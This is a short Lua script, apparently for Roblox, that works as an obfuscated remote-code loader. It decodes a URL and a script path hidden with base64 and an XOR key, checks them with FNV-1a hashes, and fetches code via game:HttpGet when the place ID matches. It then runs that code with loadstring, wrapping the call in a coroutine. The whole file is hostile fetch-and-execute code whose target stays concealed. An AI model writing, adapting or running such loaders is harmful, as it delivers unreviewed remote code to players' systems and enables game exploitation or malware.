local B64_CHARS = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
local XOR_KEY   = {0x4C,0x55,0x41,0x52,0x4F,0x43,0x4B,0x53}

local function b64_decode(s)
    s = s:gsub("[^"..B64_CHARS.."=]","")
    local out = {}
    for a,b,c,d in s:gmatch("(.)(.)(.?)(.?)") do
        local n1 = (B64_CHARS:find(a,1,true) or 1)-1
        local n2 = (B64_CHARS:find(b,1,true) or 1)-1
        local n3 = (B64_CHARS:find(c~="" and c or "A",1,true) or 1)-1
        local n4 = (B64_CHARS:find(d~="" and d or "A",1,true) or 1)-1
        local v  = n1*0x40000 + n2*0x1000 + n3*0x40 + n4
        out[#out+1] = string.char(math.floor(v/0x10000)%0x100)
        if c~="" then out[#out+1] = string.char(math.floor(v/0x100)%0x100) end
        if d~="" then out[#out+1] = string.char(v%0x100) end
    end
    return table.concat(out)
end

local function xor_decode(s)
    local out = {}
    for i = 1,#s do
        out[i] = string.char(string.byte(s,i) ~ XOR_KEY[(i-1)%#XOR_KEY+1])
    end
    return table.concat(out)
end

local function decode(e)   return xor_decode(b64_decode(e)) end
local function fnv1a(s)
    local h = 0x811C9DC5
    for i = 1,#s do h = (h~string.byte(s,i))*0x01000193%0x100000000 end
    return h
end

local RAW     = decode("JCE1Ijx5ZHw+NDZ8KCo/Ozk3NCEqMSg8IiEkPDttKDwheiszJCZ6YH5gbjAqNz82Png0PCY1LiE/NC1/JzYpfD4wJyFgKy4yKCZuPy4qJXw=")
local SCRIPTS = {[7709344486] = decode("PzYzOz83OHw8JyghIC0nOiowbz46Ig==")}
local HASHES  = {raw = fnv1a(RAW), [7709344486] = fnv1a(SCRIPTS[7709344486])}

local function verified(v,e) return fnv1a(v)==e end

local function run()
    local file = SCRIPTS[game.PlaceId]
    if not file then return end
    if not verified(RAW,HASHES.raw) then return end
    if not verified(file,HASHES[game.PlaceId]) then return end
    local ok,src = pcall(function() return game:HttpGet(RAW..file) end)
    if not ok or not src or src=="" then return end
    local fn = loadstring(src)
    if not fn then return end
    fn()
end

local co = coroutine.create(function() coroutine.yield() run() end)
coroutine.resume(co)
coroutine.resume(co)
